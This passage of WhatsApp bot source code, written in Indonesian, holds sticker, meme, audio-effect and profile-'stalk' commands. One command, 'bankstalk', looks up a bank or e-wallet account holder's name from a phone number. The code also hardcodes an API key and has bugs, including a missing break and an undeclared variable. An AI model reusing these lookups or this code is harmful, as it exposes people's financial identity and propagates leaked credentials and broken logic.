                    m.reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`, {
                        quoted: fkontak1
                    })
                } catch (e) {
                    Replyx('Kota Tidak Di Temukan!', {
                        quoted: fkontak1
                    })
                }
            }
            await Xlesy.sendMessage(m.chat, {
                react: {
                    text: '✅',
                    key: m.key
                }
            })
            break
            case 'sticker':
            case 'stiker':
            case 's':
            case 'stickergif':
            case 'stikergif':
            case 'sgif':
            case 'stickerwm':
            case 'swm':
            case 'curi':
            case 'colong':
            case 'take':
            case 'stickergifwm':
            case 'sgifwm': {
                if (!/image|video|sticker/.test(quoted.type)) return Replyx(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Image/Video/Gif 1-9 Detik`, {
                    quoted: fkontak1
                })
                let media = await quoted.download()
                let teks1 = text.split`|` [0] ? text.split`|` [0] : ''
                let teks2 = text.split`|` [1] ? text.split`|` [1] : ''
                if (/image|webp/.test(mime)) {
                    Replyx(mess.wait)
                    await Xlesy.sendAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                } else if (/video/.test(mime)) {
                    if ((qmsg).seconds > 11) return Replyx('Maksimal 10 detik!')
                    Replyx(mess.wait)
                    await Xlesy.sendAsSticker(m.chat, media, m, {
                        packname: teks1,
                        author: teks2
                    })
                } else {
                    Replyx(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`, {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'smeme':
            case 'stickmeme':
            case 'stikmeme':
            case 'stickermeme':
            case 'stikermeme': {
                try {
                    //if (!isPremium) return m.reply(mess.prem)
                    if (!isLimit) return Replyx(mess.limit)
                    if (!/image|webp/.test(mime)) return Replyx(`Kirim/reply image/sticker\nDengan caption ${prefix + command} atas|bawah`, {
                        quoted: fkontak1
                    })
                    if (!text) return Replyx(`Kirim/reply image/sticker dengan caption ${prefix + command} atas|bawah`, {
                        quoted: fkontak1
                    })
                    Replyx(mess.wait)
                    let atas = text.split`|` [0] ? text.split`|` [0] : '-'
                    let bawah = text.split`|` [1] ? text.split`|` [1] : '-'
                    let media = await quoted.download()
                    let mem = await UguuSe(media)
                    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
                    await Xlesy.sendAsSticker(m.chat, smeme, m, {
                        packname: packname,
                        author: author
                    })
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Server Meme Sedang Offline!')
                }
            }
            case 'emojimix': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return Replyx(`Example: ${prefix + command} 😅+🤔`, {
                    quoted: fkontak1
                })
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1 && !emoji2) return Replyx(`Example: ${prefix + command} 😅+🤔`, {
                    quoted: fkontak1
                })
                try {
                    let anu = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`, {
                        quoted: fkontak1
                    })
                    if (anu.data.results.length < 1) return m.reply(`Mix Emoji ${text} Tidak Ditemukan!`, {
                        quoted: fkontak1
                    })
                    for (let res of anu.data.results) {
                        await Xlesy.sendAsSticker(m.chat, res.url, m, {
                            packname: packname,
                            author: author
                        })
                    }
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Gagal Mix Emoji!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'qc':
            case 'quote':
            case 'fakechat': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text && !m.quoted) return Replyx(`Kirim/reply pesan *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                try {
                    let ppnya = await Xlesy.profilePictureUrl(m.sender, 'image').catch(() => 'https://i.pinimg.com/564x/8a/e9/e9/8ae9e92fa4e69967aa61bf2bda967b7b.jpg');
                    let res = await quotedLyo(text, m.pushName, ppnya);
                    await Xlesy.sendAsSticker(m.chat, Buffer.from(res.result.image, 'base64'), m, {
                        packname: packname,
                        author: author
                    })
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Server Create Sedang Offline!')
                }
            }
            break
            case 'bratanime': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🕑',
                        key: m.key
                    }
                })
                if (!isLimit) return m.reply(mess.limit, {
                    quoted: fkontak1
                })
                if (!text && (!m.quoted || !m.quoted.text)) return Replyx(`Kirim/reply pesan *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                try {
                    await Xlesy.sendAsSticker(m.chat, 'https://api.agungny.my.id/api/animbrat?q=' + encodeURIComponent(text || m.quoted.text), m)
                    setLimit(m, db)
                } catch (e) {
                    try {
                        await Xlesy.sendAsSticker(m.chat, 'https://api.agungny.my.id/api/animbrat?q=pp' + encodeURIComponent(text || m.quoted.text), {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    } catch (e) {
                        Replyx('Server Brat Sedang Offline!', {
                            quoted: fkontak1
                        })
                    }
                }
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                })
            }
            break            
            case 'brat': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🕑',
                        key: m.key
                    }
                })
                if (!isLimit) return Replyx(mess.limit)
                if (!text && (!m.quoted || !m.quoted.text)) return Replyx(`Kirim/reply pesan *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                try {
                    await Xlesy.sendAsSticker(m.chat, 'https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(text || m.quoted.text), m)
                    setLimit(m, db)
                } catch (e) {
                    try {
                        await Xlesy.sendAsSticker(m.chat, 'https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(text || m.quoted.text), {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    } catch (e) {
                        Replyx('Server Brat Sedang Offline!', {
                            quoted: fkontak1
                        })
                    }
                }
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                })
            }
            break           
            case 'bratvid':
            case 'bratvideo': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text && (!m.quoted || !m.quoted.text)) return Replyx(`Kirim/reply pesan *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                const teks = (m.quoted ? m.quoted.text : text).split(' ');
                const tempDir = path.join(process.cwd(), 'database/sampah');
                try {
                    const framePaths = [];
                    for (let i = 0; i < teks.length; i++) {
                        const currentText = teks.slice(0, i + 1).join(' ');
                        let ress
                        try {
                            res = await axios.get('https://brat.caliphdev.com/api/brat?text=' + encodeURIComponent(currentText), {
                                responseType: 'arraybuffer'
                            });
                        } catch (e) {
                            res = await axios.get('https://mannoffc-x.hf.space/brat?q=' + encodeURIComponent(currentText), {
                                responseType: 'arraybuffer'
                            });
                        }
                        const framePath = path.join(tempDir, `${m.sender + i}.mp4`, {
                            quoted: fkontak1
                        });
                        fs.writeFileSync(framePath, res.data);
                        framePaths.push(framePath);
                    }
                    const fileListPath = path.join(tempDir, `${m.sender}.txt`, {
                        quoted: fkontak1
                    });
                    let fileListContent = '';
                    for (let i = 0; i < framePaths.length; i++) {
                        fileListContent += `file '${framePaths[i]}'\n`;
                        fileListContent += `duration 0.5\n`;
                    }
                    fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`;
                    fileListContent += `duration 3\n`;
                    fs.writeFileSync(fileListPath, fileListContent);
                    const outputVideoPath = path.join(tempDir, `${m.sender}-output.mp4`, {
                        quoted: fkontak1
                    });
                    execSync(`ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf 'fps=30' -c:v libx264 -preset veryfast -pix_fmt yuv420p -t 00:00:10 ${outputVideoPath}`, {
                        quoted: fkontak1
                    });
                    Xlesy.sendAsSticker(m.chat, outputVideoPath, m, {
                        packname: packname,
                        author: author
                    })
                    framePaths.forEach((filePath) => fs.unlinkSync(filePath));
                    fs.unlinkSync(fileListPath);
                    fs.unlinkSync(outputVideoPath);
                    setLimit(m, db)
                } catch (e) {
                    console.log(e)
                    Replyx('Terjadi Kesalahan Saat Memproses Permintaan!', {
                        quoted: fkontak1
                    })
                }
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key
                    }
                })
            }
            break
            case 'wasted': {
                if (!isLimit) return Replyx(mess.limit)
                try {
                    if (/jpg|jpeg|png/.test(mime)) {
                        Replyx(mess.wait)
                        let media = await quoted.download()
                        let anu = await UguuSe(media)
                        await Xlesy.sendFileUrl(m.chat, 'https://some-random-api.com/canvas/wasted?avatar=' + anu.url, 'Nih Bro', m)
                        setLimit(m, db)
                    } else {
                        Replyx('Send Media yg ingin di Upload', {
                            quoted: fkontak1
                        })
                    }
                } catch (e) {
                    Replyx('Server Canvas Sedang Offline!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'trigger':
            case 'triggered': {
                if (!isLimit) return Replyx(mess.limit)
                try {
                    if (/jpg|jpeg|png/.test(mime)) {
                        Replyx(mess.wait)
                        let media = await quoted.download()
                        let anu = await UguuSe(media)
                        await m.reply({
                            document: {
                                url: 'https://some-random-api.com/canvas/triggered?avatar=' + anu.url
                            },
                            fileName: 'triggered.gif',
                            mimetype: 'image/gif'
                        })
                        setLimit(m, db)
                    } else {
                        Replyx('Send Media yg ingin di Upload!')
                    }
                } catch (e) {
                    Replyx('Server Canvas Sedang Offline!')
                }
            }
            break
            case 'nulis': {
                m.reply(`*Example*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`, {
                    quoted: fkontak1
                })
            }
            break
            case 'nuliskiri': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                        './src/nulis/images/buku/sebelumkiri.jpg',
                        '-font',
                        './src/nulis/font/Indie-Flower.ttf',
                        '-size',
                        '960x1280',
                        '-pointsize',
                        '23',
                        '-interline-spacing',
                        '2',
                        '-annotate',
                        '+140+153',
                        fixHeight,
                        './src/nulis/images/buku/setelahkiri.jpg'
                    ])
                    .on('error', () => m.reply(mess.error))
                    .on('exit', () => {
                        m.reply({
                            image: fs.readFileSync('./src/nulis/images/buku/setelahkiri.jpg'),
                            caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
                        }, {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    })
            }
            break
            case 'nuliskanan': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                        './src/nulis/images/buku/sebelumkanan.jpg',
                        '-font',
                        './src/nulis/font/Indie-Flower.ttf',
                        '-size',
                        '960x1280',
                        '-pointsize',
                        '23',
                        '-interline-spacing',
                        '2',
                        '-annotate',
                        '+128+129',
                        fixHeight,
                        './src/nulis/images/buku/setelahkanan.jpg'
                    ])
                    .on('error', () => m.reply(mess.error))
                    .on('exit', () => {
                        m.reply({
                            image: fs.readFileSync('./src/nulis/images/buku/setelahkanan.jpg'),
                            caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
                        }, {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    })
            }
            break
            case 'foliokiri': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                        './src/nulis/images/folio/sebelumkiri.jpg',
                        '-font',
                        './src/nulis/font/Indie-Flower.ttf',
                        '-size',
                        '1720x1280',
                        '-pointsize',
                        '23',
                        '-interline-spacing',
                        '4',
                        '-annotate',
                        '+48+185',
                        fixHeight,
                        './src/nulis/images/folio/setelahkiri.jpg'
                    ])
                    .on('error', () => m.reply(mess.error))
                    .on('exit', () => {
                        m.reply({
                            image: fs.readFileSync('./src/nulis/images/folio/setelahkiri.jpg'),
                            caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
                        }, {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    })
            }
            break
            case 'foliokanan': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`, {
                    quoted: fkontak1
                })
                Replyx(mess.wait)
                const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                        './src/nulis/images/folio/sebelumkanan.jpg',
                        '-font',
                        './src/nulis/font/Indie-Flower.ttf',
                        '-size',
                        '1720x1280',
                        '-pointsize',
                        '23',
                        '-interline-spacing',
                        '4',
                        '-annotate',
                        '+89+190',
                        fixHeight,
                        './src/nulis/images/folio/setelahkanan.jpg'
                    ])
                    .on('error', () => m.reply(mess.error))
                    .on('exit', () => {
                        m.reply({
                            image: fs.readFileSync('./src/nulis/images/folio/setelahkanan.jpg'),
                            caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ'
                        }, {
                            quoted: fkontak1
                        })
                        setLimit(m, db)
                    })
            }
            break
            case 'bass':
            case 'blown':
            case 'deep':
            case 'earrape':
            case 'fast':
            case 'fat':
            case 'nightcore':
            case 'reverse':
            case 'robot':
            case 'slow':
            case 'smooth':
            case 'tupai': {
                try {
                    let set;
                    if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                    if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                    if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                    if (/earrape/.test(command)) set = '-af volume=12'
                    if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                    if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                    if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                    if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                    if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                    if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                    if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                    if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                    if (/audio/.test(mime)) {
                        Replyx(mess.wait)
                        let media = await Xlesy.downloadAndSaveMediaMessage(qmsg)
                        let ran = `./database/sampah/${getRandom('.mp3')}`;
                        exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                            fs.unlinkSync(media)
                            if (err) return m.reply(err)
                            let buff = fs.readFileSync(ran)
                            m.reply({
                                audio: buff,
                                mimetype: 'audio/mpeg'
                            })
                            fs.unlinkSync(ran)
                        });
                    } else {
                        m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`, {
                            quoted: fkontak1
                        })
                    }
                } catch (e) {
                    Replyx('Gagal!')
                }
            }
            break
            case 'tinyurl':
            case 'shorturl':
            case 'shortlink': {
                if (!isLimit) return Replyx(mess.limit)
                if (!text || !isUrl(text)) return Replyx(`Example: ${prefix + command} https://github.com/Gxyenn`, {
                    quoted: fkontak1
                })
                try {
                    let anu = await axios.get('https://tinyurl.com/api-create.php?url=' + text)
                    Replyx('Url : ' + anu.data)
                    setLimit(m, db)
                } catch (e) {
                    Replyx('Gagal!')
                }
            }
            break
            //Stalk menu
            case 'xboxstalk': {
  if (!q) return Replyx('Masukkan username Xbox!\nContoh: .xboxstalk Namenya');
  
  try {
    Replyx(mess.load);

    let username = encodeURIComponent(q.trim());
    let apiUrl = `https://fastrestapis.fasturl.cloud/stalk/xbox?username=${username}&mode=image`;

    await Xlesy.sendMessage(m.chat, { 
      image: { url: apiUrl }, 
      caption: `*「 XBOX STALK 」*\n\nUsername: ${q}`
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan saat mengambil data Xbox!');
  }
}
break;
            
          case 'bankstalk': {
  if (!q) return Replyx('Masukkan nomor HP/akun!\nContoh: .bankstalk nomornya');

  let teks = q.split('|')[0]?.trim();
  let bank = q.split('|')[1]?.trim()?.toLowerCase();

  if (!bank) {
    // Load gambar untuk headerType 4
    const media = await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/csuall.png' } }, { upload: Xlesy.waUploadToServer });

    let buttons = {
      buttonsMessage: {
        contentText: `Pilih merk bank Anda untuk nomor:\n\n*${teks}*`,
        footerText: "Gxyenn My Dev",
        buttons: [
          {
            buttonId: `.pilihbank`, // optional, WA native flow kadang tidak butuh ini
            buttonText: { displayText: "🔎 Pilih Bank" },
            type: 2,
            nativeFlowInfo: {
              name: "single_select",
              paramsJson: JSON.stringify({
                title: "BANK PILIHAN",
                sections: [
                  {
                    title: "Dompet Digital",
                    highlight_label: "Populer",
                    rows: [
                      { id: `.bankstalk ${teks}|dana`, title: "DANA", description: "Cek akun DANA" },
                      { id: `.bankstalk ${teks}|gopay`, title: "GoPay", description: "Cek akun GoPay" },
                      { id: `.bankstalk ${teks}|ovo`, title: "OVO", description: "Cek akun OVO" },
                      { id: `.bankstalk ${teks}|linkaja`, title: "LinkAja", description: "Cek akun LinkAja" },
                      { id: `.bankstalk ${teks}|shopeepay`, title: "ShopeePay", description: "Cek akun ShopeePay" }
                    ]
                  },
                  {
                    title: "Bank Nasional",
                    rows: [
                      { id: `.bankstalk ${teks}|bri`, title: "BRI", description: "Cek akun BRI" },
                      { id: `.bankstalk ${teks}|bca`, title: "BCA", description: "Cek akun BCA" },
                      { id: `.bankstalk ${teks}|bni`, title: "BNI", description: "Cek akun BNI" },
                      { id: `.bankstalk ${teks}|mandiri`, title: "Mandiri", description: "Cek akun Mandiri" },
                      { id: `.bankstalk ${teks}|permata`, title: "Permata", description: "Cek akun Permata" },
                      { id: `.bankstalk ${teks}|panin`, title: "Panin", description: "Cek akun Panin" },
                      { id: `.bankstalk ${teks}|ocbc`, title: "OCBC NISP", description: "Cek akun OCBC" },
                      { id: `.bankstalk ${teks}|citibank`, title: "Citibank", description: "Cek akun Citibank" },
                      { id: `.bankstalk ${teks}|hsbc`, title: "HSBC", description: "Cek akun HSBC" },
                      { id: `.bankstalk ${teks}|dbs`, title: "DBS", description: "Cek akun DBS" },
                      { id: `.bankstalk ${teks}|uob`, title: "UOB", description: "Cek akun UOB" },
                      { id: `.bankstalk ${teks}|bri_agroniaga`, title: "BRI Agroniaga", description: "Cek akun BRI Agroniaga" }
                    ]
                  },
                  {
                    title: "Bank Syariah",
                    rows: [
                      { id: `.bankstalk ${teks}|muamalat`, title: "Muamalat", description: "Cek akun Muamalat" },
                      { id: `.bankstalk ${teks}|bsi`, title: "Bank Syariah Indonesia", description: "Cek akun BSI" },
                      { id: `.bankstalk ${teks}|mandiri_syar`, title: "Mandiri Syariah", description: "Cek akun Mandiri Syariah" },
                      { id: `.bankstalk ${teks}|bni_syar`, title: "BNI Syariah", description: "Cek akun BNI Syariah" },
                      { id: `.bankstalk ${teks}|permata_syar`, title: "Permata Syariah", description: "Cek akun Permata Syariah" }
                    ]
                  }
                ]
              })
            }
          }
        ],
        headerType: 4,
        imageMessage: media.imageMessage,
        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: "XLESYVIP",
            body: "グキエン",
            showAdAttribution: true,
            thumbnailUrl: fake.gandathumburl,
            mediaType: 1,
            previewType: 0,
            renderLargerThumbnail: true,
            mediaUrl: my.yt,
            sourceUrl: my.yt
          }
        }
      }
    };

    const generatedMessage = await generateWAMessageFromContent(m.chat, buttons, {
      userJid: m.sender,
      quoted: ftroli
    });

    await Xlesy.relayMessage(m.chat, generatedMessage.message, {
      additionalNodes: [
        {
          tag: "biz",
          attrs: {},
          content: [
            {
              tag: "interactive",
              attrs: { type: "native_flow", v: "1" },
              content: [
                { tag: "native_flow", attrs: { name: "quick_reply" } }
              ]
            }
          ]
        }
      ]
    });

  } else {
    // Kalau bank sudah dipilih, langsung fetch API
    Replyx(mess.load);
    let url = `https://fastrestapis.fasturl.cloud/stalk/bank?number=${encodeURIComponent(teks)}&bank=${encodeURIComponent(bank)}`;
    try {
      let res = await fetch(url);
      let json = await res.json();
      if (json.status !== 200 || !json.result.status) return Replyx('Data tidak ditemukan atau salah!');

      let data = json.result.data;
      let hasil = `*「 BANK STALK 」*\n\n` +
                  `*Account Number:* ${data.account_number}\n` +
                  `*Account Name:* ${data.name}\n` +
                  `*Bank Code:* ${data.bank_code.toUpperCase()}\n\n`

      await Xlesy.sendMessage(m.chat, { text: hasil }, { quoted: m });
    } catch (e) {
      console.error(e);
      Replyx('Terjadi kesalahan saat mengambil data!');
    }
  }
}
break;

case 'steamstalk': {
  if (!q) return Replyx('Masukkan username Steam!\nContoh: .steamstalk Namenya');
  
  try {
    Replyx(mess.load);

    let username = encodeURIComponent(q.trim());
    let apiUrl = `https://fastrestapis.fasturl.cloud/stalk/steam?username=${username}`;

    let res = await fetch(apiUrl);
    let json = await res.json();

    if (json.status !== 200 || !json.result) return Replyx('Data tidak ditemukan atau salah!');
    
    let r = json.result;

    let teks = `*「 STEAM STALK 」*\n\n` +
               `*Persona Name:* ${r.personaName}\n` +
               `*Real Name:* ${r.realName}\n` +
               `*Location:* ${r.location}\n` +
               `*Level:* ${r.level}\n` +
               `*Games:* ${r.games}\n` +
               `*Screenshots:* ${r.screenshots}\n` +
               `*Videos:* ${r.videos}\n` +
               `*Reviews:* ${r.reviews}\n` +
               `*Friends:* ${r.friends}\n\n` +
               `*Achievements:* ${r.achievements.total} total (${r.achievements.avgCompletionRate}% avg)\n\n`;

    if (r.badges && r.badges.badgeInfo && r.badges.badgeInfo.length > 0) {
      teks += `*Badges:*\n`;
      for (let badge of r.badges.badgeInfo) {
        teks += `- ${badge.name} (${badge.xp})\n`;
      }
      teks += `\n`;
    }

    if (r.recentGames && r.recentGames.length > 0) {
      teks += `*Recent Games:*\n`;
      for (let game of r.recentGames) {
        teks += `- ${game.gameName} (${game.lastPlayed} hrs)\n`;
      }
      teks += `\n`;
    }

    if (r.comments && r.comments.length > 0) {
      teks += `*Recent Comments:*\n`;
      for (let comment of r.comments.slice(0, 3)) { // Batas 3 komentar
        teks += `- ${comment.author}: ${comment.text}\n`;
      }
      teks += `\n`;
    }

    await Xlesy.sendMessage(m.chat, { 
      image: { url: r.avatar },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan saat mengambil data Steam!');
  }
}
break;
           case 'ffstalk':
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} idnya`);
  
  let id = q.trim();
  if (!/^\d{8,}$/.test(id)) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} idnya`);
  }
  
  Replyx(mess.load)
  
  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/freefire?uid=${id}&region=id`);
    let data = await res.json();
    
    if (data.status != 200 || !data.result || !data.result.accountInfo) {
      return Replyx("User tidak ditemukan atau API error.");
    }

    let info = data.result.accountInfo;
    let guild = data.result.guildInfo || {};
    let captain = data.result.captainBasicInfo || {};
    
    let teks = `*FF Stalker Result*\n\n`;
    teks += `➤ *Nama*: ${info.name || '-'}\n`;
    teks += `➤ *Level*: ${info.level || '-'}\n`;
    teks += `➤ *EXP*: ${info.exp || '-'}\n`;
    teks += `➤ *Likes*: ${info.likes || '-'}\n`;
    teks += `➤ *Region*: ${info.region || '-'}\n`;
    teks += `➤ *Last Login*: ${info.lastLogin ? new Date(info.lastLogin * 1000).toLocaleString('id-ID') : '-'}\n`;
    teks += `➤ *Create Time*: ${info.createTime ? new Date(info.createTime * 1000).toLocaleString('id-ID') : '-'}\n`;
    teks += `➤ *Rank BR Point*: ${info.brRankPoint || '-'}\n`;
    teks += `➤ *Rank CS Point*: ${info.csRankPoint || '-'}\n`;
    teks += `➤ *Season ID*: ${info.seasonId || '-'}\n`;
    teks += `➤ *Release Version*: ${info.releaseVersion || '-'}\n`;
    teks += `➤ *Account Type*: ${info.accountType == 1 ? 'Normal' : 'Guest'}\n`;
    teks += `➤ *BP Badges*: ${info.bpBadges || '-'}\n`;
    teks += `➤ *Avatar ID*: ${info.avatarId || '-'}\n`;
    teks += `➤ *Banner ID*: ${info.bannerId || '-'}\n\n`;

    if (guild.name) {
      teks += `*Guild Info*\n`;
      teks += `➤ *Nama Guild*: ${guild.name || '-'}\n`;
      teks += `➤ *Level Guild*: ${guild.level || '-'}\n`;
      teks += `➤ *Member Count*: ${guild.memberCount || '-'}\n`;
      teks += `➤ *Capacity*: ${guild.capacity || '-'}\n\n`;
    }

    teks += `*Captain Info*\n`;
    teks += `➤ *Account ID*: ${captain.accountId || '-'}\n`;
    teks += `➤ *Badge Count*: ${captain.badgeCount || '-'}\n`;
    teks += `➤ *Created At*: ${captain.createdAt ? new Date(captain.createdAt * 1000).toLocaleString('id-ID') : '-'}\n`;
    teks += `➤ *Level*: ${captain.level || '-'}\n`;
    teks += `➤ *EXP*: ${captain.exp || '-'}\n`;
    teks += `➤ *Likes*: ${captain.likes || '-'}\n`;
    teks += `➤ *Last Login*: ${captain.lastLoginAt ? new Date(captain.lastLoginAt * 1000).toLocaleString('id-ID') : '-'}\n`;
    
    Replyx(teks);
    
  } catch (err) {
    console.error(err);
    Replyx("User tidak ditemukan atau API error.");
  }
  break; 
 case 'telestalk': {
  if (!q) return Replyx('Masukkan username Telegram!\nContoh: .telestalk Namenya');
  Replyx(mess.load);
  
  let url = `https://fastrestapis.fasturl.cloud/stalk/telegram?username=${q}`;
  try {
    let res = await fetch(url);
    let json = await res.json();
    
    if (json.status !== 200) return Replyx('Data tidak ditemukan!');
    
    let result = json.result;
    let teks = `*「 TELEGRAM STALK 」*\n\n` +
      `*Title:* ${result.title || '-'}\n` +
      `*Description:* ${result.desc || '-'}\n` +
      `*Image URL:* ${result.imageUrl || '-'}\n`;
    
    // Kirim foto profil dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: result.imageUrl },
      caption: teks
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Replyx('Terjadi kesalahan!');
  }
}
break;
 case 'genshinstalk': {
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} idnya`);
  
  let uid = q.trim();
  if (!/^\d{9,}$/.test(uid)) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} idnya`);
  }

  Replyx(mess.load);

  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/genshin/simple?uid=${uid}`);
    let data = await res.json();

    if (data.status != 200 || !data.result || !data.result.playerData) {
      return Replyx("User tidak ditemukan atau API error.");
    }

    let player = data.result.playerData;
    let teks = `*Genshin Impact Stalker Result*\n\n`;
    teks += `➤ *Nama*: ${player.nickname || '-'}\n`;
    teks += `➤ *Level*: ${player.level || '-'}\n`;
    teks += `➤ *World Level*: ${player.worldLevel || '-'}\n`;
    teks += `➤ *Achievements*: ${player.achievements || '-'}\n`;
    teks += `➤ *Spiral Abyss*: ${player.spiralAbyss || '-'}\n`;
    teks += `➤ *UID*: ${player.uid || '-'}\n`;
    teks += `➤ *Details*: ${player.detailsUrl || '-'}\n\n`;
    teks += `➤ *Screenshot*: ${data.result.screenshotUrl || '-'}\n`;

    // Kirim gambar dengan caption data lengkap
    await Xlesy.sendMessage(m.chat, {
      image: { url: data.result.screenshotUrl },
      caption: teks
    }, { quoted: m });

  } catch (err) {
    console.error(err);
    Replyx("User tidak ditemukan atau API error.");
  }
}
break;
case 'ttstalk': {
  if (!q) return Replyx(`Contoh penggunaan:\n${prefix + command} Username`);

  let username = q.trim();
  if (!username) {
    return Replyx(`Format salah!\nContoh: ${prefix + command} username`);
  }

  Replyx(mess.load);

  try {
    let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/tiktok/profile?username=${username}`);
    let data = await res.json();

    if (data.status !== 200 || !data.result || !data.result.username) {
      return Replyx("User tidak ditemukan atau API error.");
    }

    let userInfo = data.result;
    let teks = `*TikTok Stalker Result*\n\n`;
    teks += `➤ *Username*: @${userInfo.username || '-'}\n`;
    teks += `➤ *Nickname*: ${userInfo.nickname || '-'}\n`;
    teks += `➤ *Country*: ${userInfo.country || '-'}\n`;
    teks += `➤ *Followers*: ${userInfo.stats.totalFollowers || '-'}\n`;
    teks += `➤ *Likes*: ${userInfo.stats.totalLikes || '-'}\n`;
